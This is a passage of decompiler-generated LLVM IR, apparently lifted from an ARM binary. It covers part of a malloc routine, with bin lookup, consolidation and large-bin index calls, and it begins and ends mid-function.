  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_166f4 = load i32, i32* @r4, align 4
  %v6_166f4 = load i32, i32* @r5, align 4
  %v9_166f4 = load i32, i32* @r6, align 4
  %v12_166f4 = load i32, i32* @r7, align 4
  %v15_166f4 = load i32, i32* @r8, align 4
  %v18_166f4 = load i32, i32* @sb, align 4
  %v21_166f4 = load i32, i32* @sl, align 4
  %v24_166f4 = load i32, i32* @fp, align 4
  %v27_166f4 = load i32, i32* @lr, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r1.global-to-local, align 4
  %v4_16708 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 76) to i32*), align 4
  store i32 %v4_16708, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v4_16714 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 40) to i32*), align 4
  store i32 %v4_16714, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_16708, i32* @r2, align 4
  %v2_16720 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_16720, i32* %r0.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %ip.global-to-local, align 4
  %v4_1672c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  store i32 %v4_1672c, i32* %ip.global-to-local, align 4
  store i32 91960, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1672c)
  %v0_16738 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16738, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r1.global-to-local, align 4
  %v4_16744 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 20) to i32*), align 4
  store i32 %v4_16744, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_16750.1405 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16744)
  %v0_16750 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_16750, -32
  br i1 %tmp, label %dec_label_pc_1676c, label %dec_label_pc_16758

dec_label_pc_16758:                               ; preds = %entry
  %v0_16758 = call i32 @__GI___errno_location()
  store i32 %v0_16758, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_16764 = inttoptr i32 %v0_16758 to i32*
  store i32 12, i32* %v2_16764, align 4
  br label %dec_label_pc_16fe8

dec_label_pc_1676c:                               ; preds = %entry
  %v1_1676c = add i32 %v0_16750, 11
  store i32 %v1_1676c, i32* %r0.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r2.global-to-local, align 4
  %v2_16778 = icmp ugt i32 %v1_1676c, 14
  %v7_16778 = icmp eq i32 %v1_1676c, 15
  %v2_1677c = xor i1 %v7_16778, true
  %v3_1677c = and i1 %v2_16778, %v2_1677c
  br i1 %v3_1677c, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_1676c
  %v5_1677c = and i32 %v1_1676c, -8
  store i32 %v5_1677c, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_1676c, %bb
  %v4_16780 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v4_16780, i32* @r0, align 4
  %v1_16784 = inttoptr i32 %v4_16780 to i32*
  %v2_16784 = load i32, i32* %v1_16784, align 4
  store i32 %v2_16784, i32* @r4, align 4
  %v2_16788 = xor i1 %v2_16778, true
  %v3_16788 = or i1 %v7_16778, %v2_16788
  br i1 %v3_16788, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_1678c = urem i32 %v2_16784, 2
  %v2_1678c = icmp eq i32 %v1_1678c, 0
  br i1 %v2_1678c, label %dec_label_pc_16794, label %dec_label_pc_167a4

dec_label_pc_16794:                               ; preds = %bb140
  %v2_16794 = icmp eq i32 %v2_16784, 0
  br i1 %v2_16794, label %dec_label_pc_1679c, label %dec_label_pc_16b80

dec_label_pc_1679c:                               ; preds = %dec_label_pc_16794
  %v0_1679c = call i32 @__malloc_consolidate()
  store i32 %v0_1679c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16b80

dec_label_pc_167a4:                               ; preds = %bb140
  %v0_167a4 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_167a4, %v2_16784
  br i1 %tmp201, label %dec_label_pc_167cc, label %dec_label_pc_167ac

dec_label_pc_167ac:                               ; preds = %dec_label_pc_167a4
  %v1_167ac = add i32 %v4_16780, -4
  store i32 %v1_167ac, i32* %r1.global-to-local, align 4
  %v3_167b0 = udiv i32 %v0_167a4, 8
  store i32 %v3_167b0, i32* %r2.global-to-local, align 4
  %v4_167b4 = mul nuw i32 %v3_167b0, 4
  %v5_167b4 = add i32 %v4_167b4, %v1_167ac
  %v6_167b4 = inttoptr i32 %v5_167b4 to i32*
  %v7_167b4 = load i32, i32* %v6_167b4, align 4
  store i32 %v7_167b4, i32* %r0.global-to-local, align 4
  %v2_167b8 = icmp eq i32 %v7_167b4, 0
  br i1 %v2_167b8, label %dec_label_pc_167cc, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_167ac
  %v2_167bc = add i32 %v7_167b4, 8
  %v3_167bc = inttoptr i32 %v2_167bc to i32*
  %v4_167bc = load i32, i32* %v3_167bc, align 4
  store i32 %v4_167bc, i32* %r3.global-to-local, align 4
  store i32 %v2_167bc, i32* %r0.global-to-local, align 4
  store i32 %v2_167bc, i32* %r4.global-to-local, align 4
  store i32 %v4_167bc, i32* %v6_167b4, align 4
  br label %dec_label_pc_16fcc

dec_label_pc_167cc:                               ; preds = %dec_label_pc_167ac, %dec_label_pc_167a4
  %tmp202 = icmp ugt i32 %v0_167a4, 255
  br i1 %tmp202, label %dec_label_pc_1681c, label %dec_label_pc_167d4

dec_label_pc_167d4:                               ; preds = %dec_label_pc_167cc
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %ip.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_167dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  %v3_167e0 = udiv i32 %v0_167a4, 8
  store i32 %v3_167e0, i32* @r7, align 4
  %v4_167e4 = mul nuw i32 %v3_167e0, 8
  %v5_167e4 = add i32 %v4_167dc, %v4_167e4
  store i32 %v5_167e4, i32* %r3.global-to-local, align 4
  %v1_167e8 = add i32 %v5_167e4, 44
  store i32 %v1_167e8, i32* %ip.global-to-local, align 4
  %v1_167ec = add i32 %v5_167e4, 56
  %v2_167ec = inttoptr i32 %v1_167ec to i32*
  %v3_167ec = load i32, i32* %v2_167ec, align 4
  store i32 %v3_167ec, i32* %r0.global-to-local, align 4
  %v9_167f0 = icmp eq i32 %v3_167ec, %v1_167e8
  br i1 %v9_167f0, label %dec_label_pc_1697c, label %dec_label_pc_167f8

dec_label_pc_167f8:                               ; preds = %dec_label_pc_167d4
  %v2_167f8 = add i32 %v3_167ec, %v0_167a4
  store i32 %v2_167f8, i32* %r3.global-to-local, align 4
  %v1_167fc = add i32 %v2_167f8, 4
  %v2_167fc = inttoptr i32 %v1_167fc to i32*
  %v3_167fc = load i32, i32* %v2_167fc, align 4
  store i32 %v3_167fc, i32* %r2.global-to-local, align 4
  %v1_16800 = add i32 %v3_167ec, 12
  %v2_16800 = inttoptr i32 %v1_16800 to i32*
  %v3_16800 = load i32, i32* %v2_16800, align 4
  store i32 %v3_16800, i32* %r1.global-to-local, align 4
  %v1_16804 = or i32 %v3_167fc, 1
  store i32 %v1_16804, i32* %r2.global-to-local, align 4
  %v1_16808 = add i32 %v3_167ec, 8
  store i32 %v1_16808, i32* %r4.global-to-local, align 4
  store i32 %v1_16804, i32* %v2_167fc, align 4
  %v0_16810 = load i32, i32* %ip.global-to-local, align 4
  %v1_16810 = load i32, i32* %r1.global-to-local, align 4
  %v2_16810 = add i32 %v1_16810, 8
  %v3_16810 = inttoptr i32 %v2_16810 to i32*
  store i32 %v0_16810, i32* %v3_16810, align 4
  %v0_16814 = load i32, i32* %r1.global-to-local, align 4
  %v1_16814 = load i32, i32* %ip.global-to-local, align 4
  %v2_16814 = add i32 %v1_16814, 12
  %v3_16814 = inttoptr i32 %v2_16814 to i32*
  store i32 %v0_16814, i32* %v3_16814, align 4
  br label %dec_label_pc_16fcc

dec_label_pc_1681c:                               ; preds = %dec_label_pc_167cc
  store i32 %v0_167a4, i32* %r0.global-to-local, align 4
  %v1_16820 = call i32 @__malloc_largebin_index(i32 %v0_167a4)
  store i32 %v1_16820, i32* %r0.global-to-local, align 4
  %v0_16824 = load i32, i32* @r4, align 4
  %v1_16824 = and i32 %v0_16824, 2
  %v2_16824 = icmp eq i32 %v1_16824, 0
  store i32 %v1_16820, i32* @r7, align 4
  br i1 %v2_16824, label %dec_label_pc_1697c, label %dec_label_pc_16830

dec_label_pc_16830:                               ; preds = %dec_label_pc_1681c
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r1.global-to-local, align 4
  %v4_16838 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v4_16838, i32* @r0, align 4
  %v0_1683c = call i32 @__malloc_consolidate()
  store i32 %v0_1683c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1697c

dec_label_pc_16844:                               ; preds = %dec_label_pc_16990
  %v1_16844 = add i32 %v3_16990, 4
  %v2_16844 = inttoptr i32 %v1_16844 to i32*
  %v3_16844 = load i32, i32* %v2_16844, align 4
  store i32 %v3_16844, i32* %r3.global-to-local, align 4
  %v0_16848 = load i32, i32* @sl, align 4
  %v1_1684c = and i32 %v3_16844, -4
  store i32 %v1_1684c, i32* %r4.global-to-local, align 4
  %v1_16850 = add i32 %v3_16990, 12
  %v2_16850 = inttoptr i32 %v1_16850 to i32*
  %v3_16850 = load i32, i32* %v2_16850, align 4
  store i32 %v3_16850, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_16848, 255
  br i1 %tmp203, label %dec_label_pc_168ac, label %dec_label_pc_16858

dec_label_pc_16858:                               ; preds = %dec_label_pc_16844
  %v9_16858 = icmp eq i32 %v3_16850, %v0_168b0
  br i1 %v9_16858, label %dec_label_pc_16860, label %dec_label_pc_168ac

dec_label_pc_16860:                               ; preds = %dec_label_pc_16858
  %v0_16860 = load i32, i32* @sb, align 4
  %v1_16860 = add i32 %v0_16860, 48
  %v2_16860 = inttoptr i32 %v1_16860 to i32*
  %v3_16860 = load i32, i32* %v2_16860, align 4
  store i32 %v3_16860, i32* %r3.global-to-local, align 4
  %v9_16864 = icmp eq i32 %v3_16990, %v3_16860
  br i1 %v9_16864, label %dec_label_pc_1686c, label %dec_label_pc_168ac

dec_label_pc_1686c:                               ; preds = %dec_label_pc_16860
  %v1_1686c = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_1684c, %v1_1686c
  br i1 %tmp204, label %dec_label_pc_16874, label %dec_label_pc_168ac

dec_label_pc_16874:                               ; preds = %dec_label_pc_1686c
  %v2_16874 = sub i32 %v1_1684c, %v0_16848
  store i32 %v2_16874, i32* %r2.global-to-local, align 4
  %v2_16878 = add i32 %v0_16848, %v3_16990
  store i32 %v2_16878, i32* %r3.global-to-local, align 4
  %v1_1687c = or i32 %v0_16848, 1
  store i32 %v1_1687c, i32* %r0.global-to-local, align 4
  %v1_16880 = or i32 %v2_16874, 1
  store i32 %v1_16880, i32* %r1.global-to-local, align 4
  %v1_16884 = add i32 %v3_16990, 8
  store i32 %v1_16884, i32* %r4.global-to-local, align 4
  %v2_16888 = add i32 %v0_168b0, 8
  %v3_16888 = inttoptr i32 %v2_16888 to i32*
  store i32 %v2_16878, i32* %v3_16888, align 4
  %v0_1688c = load i32, i32* %r3.global-to-local, align 4
  %v1_1688c = load i32, i32* %ip.global-to-local, align 4
  %v2_1688c = add i32 %v1_1688c, 12
  %v3_1688c = inttoptr i32 %v2_1688c to i32*
  store i32 %v0_1688c, i32* %v3_1688c, align 4
  %v0_16890 = load i32, i32* %r0.global-to-local, align 4
  %v1_16890 = load i32, i32* @r6, align 4
  %v2_16890 = add i32 %v1_16890, 4
  %v3_16890 = inttoptr i32 %v2_16890 to i32*
  store i32 %v0_16890, i32* %v3_16890, align 4
  %v0_16894 = load i32, i32* %r3.global-to-local, align 4
  %v1_16894 = load i32, i32* @sb, align 4
  %v2_16894 = add i32 %v1_16894, 48
  %v3_16894 = inttoptr i32 %v2_16894 to i32*
  store i32 %v0_16894, i32* %v3_16894, align 4
  %v0_16898 = load i32, i32* %r2.global-to-local, align 4
  %v1_16898 = load i32, i32* %r3.global-to-local, align 4
  %v3_16898 = add i32 %v1_16898, %v0_16898
  %v4_16898 = inttoptr i32 %v3_16898 to i32*
  store i32 %v0_16898, i32* %v4_16898, align 4
  %v0_1689c = load i32, i32* %r1.global-to-local, align 4
  %v1_1689c = load i32, i32* %r3.global-to-local, align 4
  %v2_1689c = add i32 %v1_1689c, 4
  %v3_1689c = inttoptr i32 %v2_1689c to i32*
  store i32 %v0_1689c, i32* %v3_1689c, align 4
  %v0_168a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_168a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_168a0 = add i32 %v1_168a0, 12
  %v3_168a0 = inttoptr i32 %v2_168a0 to i32*
  store i32 %v0_168a0, i32* %v3_168a0, align 4
  %v0_168a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_168a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_168a4 = add i32 %v1_168a4, 8
  %v3_168a4 = inttoptr i32 %v2_168a4 to i32*
  store i32 %v0_168a4, i32* %v3_168a4, align 4
  br label %dec_label_pc_16fcc

dec_label_pc_168ac:                               ; preds = %dec_label_pc_1686c, %dec_label_pc_16860, %dec_label_pc_16858, %dec_label_pc_16844
  %v9_168ac = icmp eq i32 %v1_1684c, %v0_16848
  %v2_168b0 = add i32 %v3_16850, 8
  %v3_168b0 = inttoptr i32 %v2_168b0 to i32*
  store i32 %v0_168b0, i32* %v3_168b0, align 4
  %v0_168b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_168b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_168b4 = add i32 %v1_168b4, 12
  %v3_168b4 = inttoptr i32 %v2_168b4 to i32*
  store i32 %v0_168b4, i32* %v3_168b4, align 4
  br i1 %v9_168ac, label %dec_label_pc_16a0c.loopexit, label %dec_label_pc_168c8

dec_label_pc_168c8:                               ; preds = %dec_label_pc_168ac
  %v0_168c8 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_168c8, 255
  br i1 %tmp205, label %dec_label_pc_168ec, label %dec_label_pc_168d0

dec_label_pc_168d0:                               ; preds = %dec_label_pc_168c8
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r2.global-to-local, align 4
  %v1_168d4 = load i32, i32* %r8.global-to-local, align 4
  %v2_168d4 = add i32 %v1_168d4, ptrtoint (i32* @global_var_2e024.1314 to i32)
  %v3_168d4 = inttoptr i32 %v2_168d4 to i32*
  %v4_168d4 = load i32, i32* %v3_168d4, align 4
  %v3_168d8 = udiv i32 %v0_168c8, 8
  store i32 %v3_168d8, i32* %r0.global-to-local, align 4
  %v4_168dc = mul nuw i32 %v3_168d8, 8
  %v5_168dc = add i32 %v4_168d4, %v4_168dc
  store i32 %v5_168dc, i32* %r3.global-to-local, align 4
  %v1_168e0 = add i32 %v5_168dc, 44
  store i32 %v1_168e0, i32* %ip.global-to-local, align 4
  %v1_168e4 = add i32 %v5_168dc, 52
  %v2_168e4 = inttoptr i32 %v1_168e4 to i32*
  %v3_168e4 = load i32, i32* %v2_168e4, align 4
  store i32 %v3_168e4, i32* @lr, align 4
  br label %dec_label_pc_16944

dec_label_pc_168ec:                               ; preds = %dec_label_pc_168c8
  store i32 %v0_168c8, i32* %r0.global-to-local, align 4
  %v1_168f0 = call i32 @__malloc_largebin_index(i32 %v0_168c8)
  store i32 %v1_168f0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %ip.global-to-local, align 4
  %v1_168f8 = load i32, i32* %r8.global-to-local, align 4
  %v2_168f8 = add i32 %v1_168f8, ptrtoint (i32* @global_var_2e024.1314 to i32)
  %v3_168f8 = inttoptr i32 %v2_168f8 to i32*
  %v4_168f8 = load i32, i32* %v3_168f8, align 4
  %v4_168fc = mul i32 %v1_168f0, 8
  %v5_168fc = add i32 %v4_168f8, %v4_168fc
  store i32 %v5_168fc, i32* %r3.global-to-local, align 4
  %v1_16900 = add i32 %v5_168fc, 44
  store i32 %v1_16900, i32* %ip.global-to-local, align 4
  %v1_16904 = add i32 %v5_168fc, 52
  %v2_16904 = inttoptr i32 %v1_16904 to i32*
  %v3_16904 = load i32, i32* %v2_16904, align 4
  store i32 %v3_16904, i32* @lr, align 4
  %v9_16908 = icmp eq i32 %v3_16904, %v1_16900
  br i1 %v9_16908, label %dec_label_pc_16944, label %dec_label_pc_16910

dec_label_pc_16910:                               ; preds = %dec_label_pc_168ec
  %v1_16910 = add i32 %v5_168fc, 56
  %v2_16910 = inttoptr i32 %v1_16910 to i32*
  %v3_16910 = load i32, i32* %v2_16910, align 4
  store i32 %v3_16910, i32* %r1.global-to-local, align 4
  %v1_16914 = add i32 %v3_16910, 4
  %v2_16914 = inttoptr i32 %v1_16914 to i32*
  %v3_16914 = load i32, i32* %v2_16914, align 4
  store i32 %v3_16914, i32* %r3.global-to-local, align 4
  %v0_16918 = load i32, i32* %r4.global-to-local, align 4
  %v3_16918 = icmp ult i32 %v0_16918, %v3_16914
  br i1 %v3_16918, label %.thread, label %dec_label_pc_16934.preheader

.thread:                                          ; preds = %dec_label_pc_16910
  store i32 %v1_16900, i32* @lr, align 4
  store i32 %v3_16910, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16944

dec_label_pc_16934.preheader:                     ; preds = %dec_label_pc_16910
  %v2_16920 = or i32 %v0_16918, 1
  store i32 %v2_16920, i32* %r2.global-to-local, align 4
  %v1_16934179 = add i32 %v3_16904, 4
  %v2_16934180 = inttoptr i32 %v1_16934179 to i32*
  %v3_16934181 = load i32, i32* %v2_16934180, align 4
  store i32 %v3_16934181, i32* %r3.global-to-local, align 4
  %v3_16938183 = icmp ult i32 %v2_16920, %v3_16934181
  br i1 %v3_16938183, label %dec_label_pc_16930, label %dec_label_pc_16940

dec_label_pc_16930:                               ; preds = %dec_label_pc_16934.preheader, %dec_label_pc_16930
  %v0_16940184 = phi i32 [ %v3_16930, %dec_label_pc_16930 ], [ %v3_16904, %dec_label_pc_16934.preheader ]
  %v1_16930 = add i32 %v0_16940184, 8
  %v2_16930 = inttoptr i32 %v1_16930 to i32*
  %v3_16930 = load i32, i32* %v2_16930, align 4
  store i32 %v3_16930, i32* @lr, align 4
  %v1_16934 = add i32 %v3_16930, 4
  %v2_16934 = inttoptr i32 %v1_16934 to i32*
  %v3_16934 = load i32, i32* %v2_16934, align 4
  store i32 %v3_16934, i32* %r3.global-to-local, align 4
  %v3_16938 = icmp ult i32 %v2_16920, %v3_16934
  br i1 %v3_16938, label %dec_label_pc_16930, label %dec_label_pc_16940

dec_label_pc_16940:                               ; preds = %dec_label_pc_16930, %dec_label_pc_16934.preheader
  %v0_16940.lcssa = phi i32 [ %v3_16904, %dec_label_pc_16934.preheader ], [ %v3_16930, %dec_label_pc_16930 ]
  %v1_16940 = add i32 %v0_16940.lcssa, 12
  %v2_16940 = inttoptr i32 %v1_16940 to i32*
  %v3_16940 = load i32, i32* %v2_16940, align 4
  store i32 %v3_16940, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16944

dec_label_pc_16944:                               ; preds = %.thread, %dec_label_pc_168ec, %dec_label_pc_168d0, %dec_label_pc_16940
  %v0_16964 = phi i32 [ %v1_16900, %dec_label_pc_168ec ], [ %v1_168e0, %dec_label_pc_168d0 ], [ %v3_16940, %dec_label_pc_16940 ], [ %v3_16910, %.thread ]
  %v0_16958 = phi i32 [ %v1_168f0, %dec_label_pc_168ec ], [ %v3_168d8, %dec_label_pc_168d0 ], [ %v1_168f0, %dec_label_pc_16940 ], [ %v1_168f0, %.thread ]
  %v1_16948 = phi i32 [ %v1_168f8, %dec_label_pc_168ec ], [ %v1_168d4, %dec_label_pc_168d0 ], [ %v1_168f8, %dec_label_pc_16940 ], [ %v1_168f8, %.thread ]
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r2.global-to-local, align 4
  %v2_16948 = add i32 %v1_16948, ptrtoint (i32* @global_var_2e024.1314 to i32)
  %v3_16948 = inttoptr i32 %v2_16948 to i32*
  %v4_16948 = load i32, i32* %v3_16948, align 4
  %v3_1694c = sdiv i32 %v0_16958, 32
  store i32 %v3_1694c, i32* %r3.global-to-local, align 4
  %v4_16950 = mul nsw i32 %v3_1694c, 4
  %v5_16950 = add i32 %v4_16948, %v4_16950
  store i32 %v5_16950, i32* %r1.global-to-local, align 4
  %v1_16954 = add i32 %v5_16950, 820
  %v2_16954 = inttoptr i32 %v1_16954 to i32*
  %v3_16954 = load i32, i32* %v2_16954, align 4
  %v1_16958 = urem i32 %v0_16958, 32
  store i32 %v1_16958, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_16960 = shl i32 1, %v1_16958
  %v8_16960 = or i32 %v3_16954, %v7_16960
  store i32 %v8_16960, i32* %r3.global-to-local, align 4
  %v1_16964 = load i32, i32* @r6, align 4
  %v2_16964 = add i32 %v1_16964, 12
  %v3_16964 = inttoptr i32 %v2_16964 to i32*
  store i32 %v0_16964, i32* %v3_16964, align 4
  %v0_16968 = load i32, i32* @lr, align 4
  %v1_16968 = load i32, i32* @r6, align 4
  %v2_16968 = add i32 %v1_16968, 8
  %v3_16968 = inttoptr i32 %v2_16968 to i32*
  store i32 %v0_16968, i32* %v3_16968, align 4
  %v0_1696c = load i32, i32* %r3.global-to-local, align 4
  %v1_1696c = load i32, i32* %r1.global-to-local, align 4
  %v2_1696c = add i32 %v1_1696c, 820
  %v3_1696c = inttoptr i32 %v2_1696c to i32*
  store i32 %v0_1696c, i32* %v3_1696c, align 4
  %v0_16970 = load i32, i32* @r6, align 4
  %v1_16970 = load i32, i32* @lr, align 4
  %v2_16970 = add i32 %v1_16970, 12
  %v3_16970 = inttoptr i32 %v2_16970 to i32*
  store i32 %v0_16970, i32* %v3_16970, align 4
  %v0_16974 = load i32, i32* @r6, align 4
  %v1_16974 = load i32, i32* %ip.global-to-local, align 4
  %v2_16974 = add i32 %v1_16974, 8
  %v3_16974 = inttoptr i32 %v2_16974 to i32*
  store i32 %v0_16974, i32* %v3_16974, align 4
  %v0_16990.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16990

dec_label_pc_1697c:                               ; preds = %dec_label_pc_1681c, %dec_label_pc_167d4, %dec_label_pc_16830
  store i32 36, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r1.global-to-local, align 4
  %v4_16984 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v4_16984, i32* @sb, align 4
  %v0_16988 = load i32, i32* @sl, align 4
  %v1_16988 = add i32 %v0_16988, 16
  store i32 %v1_16988, i32* @fp, align 4
  %v1_1698c = add i32 %v4_16984, 52
  store i32 %v1_1698c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16990

dec_label_pc_16990:                               ; preds = %dec_label_pc_16944, %dec_label_pc_1697c
  %v0_168b0 = phi i32 [ %v0_16990.pre, %dec_label_pc_16944 ], [ %v1_1698c, %dec_label_pc_1697c ]
  %v1_16990 = add i32 %v0_168b0, 12
  %v2_16990 = inttoptr i32 %v1_16990 to i32*
  %v3_16990 = load i32, i32* %v2_16990, align 4
  store i32 %v3_16990, i32* @r6, align 4
  %v9_16994 = icmp eq i32 %v3_16990, %v0_168b0
  br i1 %v9_16994, label %dec_label_pc_1699c, label %dec_label_pc_16844

dec_label_pc_1699c:                               ; preds = %dec_label_pc_16990
  %v0_1699c = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_1699c, 256
  %v0_16a54.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_1699c.dec_label_pc_16a54_crit_edge, label %dec_label_pc_169a4

dec_label_pc_1699c.dec_label_pc_16a54_crit_edge:  ; preds = %dec_label_pc_1699c
  %.pre200 = mul i32 %v0_16a54.pre, 8
  br label %dec_label_pc_16a54

dec_label_pc_169a4:                               ; preds = %dec_label_pc_1699c
  %v4_169a4 = mul i32 %v0_16a54.pre, 8
  %v5_169a4 = add i32 %v4_169a4, %v0_168b0
  store i32 %v5_169a4, i32* %r3.global-to-local, align 4
  %v1_169a8 = add i32 %v5_169a4, -8
  store i32 %v1_169a8, i32* %r1.global-to-local, align 4
  %v1_169ac = add i32 %v5_169a4, 4
  %v2_169ac = inttoptr i32 %v1_169ac to i32*
  %storemerge.pre = load i32, i32* %v2_169ac, align 4
  br label %dec_label_pc_16a4c

dec_label_pc_169b4:                               ; preds = %dec_label_pc_16a4c
  %v1_169b4 = add i32 %v1_169dc, 4
  %v2_169b4 = inttoptr i32 %v1_169b4 to i32*
  %v3_169b4 = load i32, i32* %v2_169b4, align 4
  store i32 %v3_169b4, i32* %r3.global-to-local, align 4
  %v1_169b8 = and i32 %v3_169b4, -4
  store i32 %v1_169b8, i32* %r2.global-to-local, align 4
  %v3_169bc = icmp ult i32 %v1_169b8, %v0_1699c
  %v1_169c0 = add i32 %v1_169dc, 12
  %v2_169c0 = inttoptr i32 %v1_169c0 to i32*
  %v3_169c0 = load i32, i32* %v2_169c0, align 4
  store i32 %v3_169c0, i32* %r0.global-to-local, align 4
  br i1 %v3_169bc, label %dec_label_pc_16a4c, label %dec_label_pc_169c8

dec_label_pc_169c8:                               ; preds = %dec_label_pc_169b4
  %v1_169c8 = add i32 %v1_169dc, 8
  %v2_169c8 = inttoptr i32 %v1_169c8 to i32*
  %v3_169c8 = load i32, i32* %v2_169c8, align 4
  store i32 %v3_169c8, i32* %r1.global-to-local, align 4
  %v1_169cc = add i32 %v3_169c8, 12
  %v2_169cc = inttoptr i32 %v1_169cc to i32*
  %v3_169cc = load i32, i32* %v2_169cc, align 4
  store i32 %v3_169cc, i32* %r3.global-to-local, align 4
  %v9_169d0 = icmp eq i32 %v3_169cc, %v1_169dc
  br i1 %v9_169d0, label %dec_label_pc_169d8, label %dec_label_pc_169e4

dec_label_pc_169d8:                               ; preds = %dec_label_pc_169c8
  %v1_169d8 = add i32 %v3_169c0, 8
  %v2_169d8 = inttoptr i32 %v1_169d8 to i32*
  %v3_169d8 = load i32, i32* %v2_169d8, align 4
  store i32 %v3_169d8, i32* %r3.global-to-local, align 4
  %v9_169dc = icmp eq i32 %v3_169d8, %v1_169dc
  br i1 %v9_169dc, label %dec_label_pc_169e8, label %dec_label_pc_169e4

dec_label_pc_169e4:                               ; preds = %dec_label_pc_169c8, %dec_label_pc_169d8
  %v0_169e4 = call i32 @abort()
  store i32 %v0_169e4, i32* %r0.global-to-local, align 4
  %v0_169e8.pre = load i32, i32* @sl, align 4
  %v1_169e8.pre = load i32, i32* @r2, align 4
  %v0_169f0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_169e8

dec_label_pc_169e8:                               ; preds = %dec_label_pc_169d8, %dec_label_pc_169e4
  %v1_169f0 = phi i32 [ %v3_169c0, %dec_label_pc_169d8 ], [ %v0_169e4, %dec_label_pc_169e4 ]
  %v0_169f0 = phi i32 [ %v3_169c8, %dec_label_pc_169d8 ], [ %v0_169f0.pre, %dec_label_pc_169e4 ]
  %v1_169e8 = phi i32 [ %v1_169b8, %dec_label_pc_169d8 ], [ %v1_169e8.pre, %dec_label_pc_169e4 ]
  %v0_169e8 = phi i32 [ %v0_1699c, %dec_label_pc_169d8 ], [ %v0_169e8.pre, %dec_label_pc_169e4 ]
  %v2_169e8 = sub i32 %v1_169e8, %v0_169e8
  store i32 %v2_169e8, i32* %lr.global-to-local, align 4
  %v2_169f0 = add i32 %v1_169f0, 8
  %v3_169f0 = inttoptr i32 %v2_169f0 to i32*
  store i32 %v0_169f0, i32* %v3_169f0, align 4
  %v0_169f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_169f4 = load i32, i32* %r1.global-to-local, align 4
